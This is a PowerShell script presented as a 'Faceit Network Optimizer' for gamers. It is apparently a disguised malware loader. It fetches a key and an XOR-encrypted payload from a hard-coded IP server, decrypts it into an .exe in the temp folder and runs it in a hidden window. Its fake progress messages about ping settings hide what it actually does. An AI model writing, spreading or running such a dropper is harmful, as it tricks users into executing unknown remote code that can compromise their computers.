# Faceit Network Optimizer

function Show-Progress {
    param([string]$Activity, [int]$Percent)
    Write-Progress -Activity $Activity -PercentComplete $Percent
}

Write-Host ""
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host "       Faceit Network Optimizer" -ForegroundColor Cyan
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

$host.UI.RawUI.ForegroundColor = 'DarkYellow'
$ping = Read-Host '  Enter max ping (ms)'
$host.UI.RawUI.ForegroundColor = 'Gray'
Write-Host ""

Show-Progress -Activity "Connecting to server..." -Percent 20

$server = 'http://74.119.192.224:5000'

try {
    Show-Progress -Activity "Requesting optimizer..." -Percent 30
    
    # Используем WebClient
    $wc = New-Object System.Net.WebClient
    $key = $wc.DownloadString("$server/key")

    Show-Progress -Activity "Sending your max ping..." -Percent 50
    $encrypted = $wc.DownloadString("$server/ad/loader.ps1")

    Show-Progress -Activity "Getting settings for optimizer..." -Percent 70
    
    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length
    
    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]

        if($j % 1000 -eq 0) {
            $percent = 70 + (($j / $z.Length) * 20)
            Show-Progress -Activity "Reading your settings..." -Percent $percent
        }
    }
    
    Show-Progress -Activity "Launching optimizer..." -Percent 95
    Start-Sleep -Milliseconds 300
    
    Write-Progress -Activity "Complete" -Completed
    
    Write-Host "  [✓] Optimizer downloaded successfully" -ForegroundColor Green
    
    # Сохраняем в временный файл
    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid()).exe"
    [System.IO.File]::WriteAllBytes($tempFile, $r)
    
    Write-Host "  [*] Saved to: $tempFile" -ForegroundColor Yellow
    
    # Запускаем с параметром ping
    $global:MaxPing = $ping
    Start-Process $tempFile -ArgumentList $ping -WindowStyle Hidden
    
    Write-Host "  [✓] Optimization started!" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
    # Очистка (опционально)
    # Start-Sleep -Seconds 5
    # Remove-Item $tempFile -Force -EA 0
    
} catch {
    Write-Progress -Activity "Error" -Completed
    Write-Host ""
    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
